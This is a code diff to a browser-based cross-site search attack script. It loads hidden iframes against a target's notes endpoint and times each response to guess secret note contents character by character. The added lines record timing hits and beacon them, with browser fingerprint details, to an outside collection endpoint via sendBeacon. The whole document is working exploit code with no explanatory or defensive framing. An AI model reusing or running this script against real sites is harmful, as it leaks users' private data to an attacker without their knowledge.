@@ -6,6 +6,7 @@ const beacon=s=>{try{navigator.sendBeacon(N,s)}catch(e){}};
 const logj=o=>beacon(JSON.stringify(Object.assign({r:RID,t:Math.round(EL()*10)/10},o)));
 onunhandledrejection=e=>{try{beacon(JSON.stringify({r:RID,t:Math.round(EL()*10)/10,er:(''+(e.reason&&e.reason.stack||e.reason)).slice(0,180)}))}catch(_){}}
 const CHARS='abcdefghijklmnopqrstuvwxyz0123456789-_ ';
+const HIT={};
 const C1=CHARS.slice(0,19).split(''),C2=CHARS.slice(19).split('');
 let seq=0,dead=0;
 addEventListener('pagehide',()=>logj({ev:'ph'}));
@@ -19,24 +20,24 @@ function probe(id,q){return new Promise(res=>{const f=document.createElement('if
  const myseq=seq++;
  setTimeout(()=>{if(!fin)document.body.appendChild(f)},14*(myseq%34));
  f.src=B+'notes/'+id+'/'+encodeURIComponent(q)+'?v='+RID+'x'+(myseq);});}
-function wave(id,chars,tickw){ // ONE id, <=20 chars, <=20 iframes
- 
+function wave(id,pfx,chars,tickw){ // ONE id, <=20 chars
 const t0=Date.now();let dn=0;const n=chars.length;let tk=0;const ds=[];
- const ps=chars.map(c=>probe(id,c).then(d=>{ds.push(d);dn++;
-  if((dn===n||Date.now()-t0>1400)&&!tk){tk=1;logj({ev:'tk',w:tickw,id:id,dn:dn,n:n})}}));
- const out=Promise.all(ps).then(()=>{logj({ev:'ds',w:tickw,id:id,ds:ds.sort((a,b)=>a-b).join(',')})});return out;}
+ const ps=chars.map(c=>probe(id,(pfx||'')+c).then(d=>{ds.push(d);dn++;
+  if(d>1800&&d<6000){const k=(pfx||'')+c;(HIT[id]=HIT[id]||{})[k]=c;}
+  if((dn===n||Date.now()-t0>1400)&&!tk){tk=1;logj({ev:'tk',w:tickw,id:id+((pfx&&'.')+pfx||''),dn:dn,n:n})}}));
+ const out=Promise.all(ps).then(()=>{logj({ev:'ds',w:tickw,id:id+((pfx&&'.')+pfx||''),ds:ds.sort((a,b)=>a-b).join(',')})});return out;}
 (async()=>{
  const H=new Map(location.hash.slice(1).split('&').map(s=>[s.split('=')[0]||'',s.split('=')[1]||'']));
- let ids=(H.get('k')||'1,2,3,4,5,6,7,8').split(',').map(x=>parseInt(x)).filter(x=>x>0);
+ let ids=(H.get('k')||'9,10,11,12,13,14,15,16,17,18,19,20,21,22').split(',').map(x=>{const p=x.split('.');return{id:parseInt(p[0]),pfx:p[1]||''}}).filter(x=>x.id>0);
  const conn=navigator.connection||{};
  logj({ev:'start',ua:navigator.userAgent.slice(0,55),ck:navigator.cookieEnabled?1:0,hc:navigator.hardwareConcurrency,et:conn.effectiveType||'-',rt:conn.rtt!=-1?conn.rtt:-1,ids:ids.join(',')});
  const m0=Date.now();
  await new Promise(res=>{const f=document.createElement('iframe');f.style.cssText='display:none';
   f.onload=()=>{logj({ev:'mk',t:Date.now()-m0});res()};f.onerror=()=>{logj({ev:'mk',err:1});res()};setTimeout(res,2500);f.src=B+'?m='+RID;document.body.appendChild(f);});
  for(let i=0;i<ids.length&&EL()<20000;i++){
-  const id=ids[i];
-  await wave(id,C1,i);if(EL()>20000){logj({ev:'cut',i:i});break;}
-  await wave(id,C2,i);logj({ev:'iddone',i:i,id:id});
+  const x=ids[i];const id=x.id,pfx=x.pfx;
+  await wave(id,pfx,C1,i);if(EL()>20000){logj({ev:'cut',i:i});break;}
+  await wave(id,pfx,C2,i);logj({ev:'iddone',i:i,id:id,p:pfx});
  }
- logj({ev:'done'});
+ logj({ev:'done',hits:HIT});
 })();
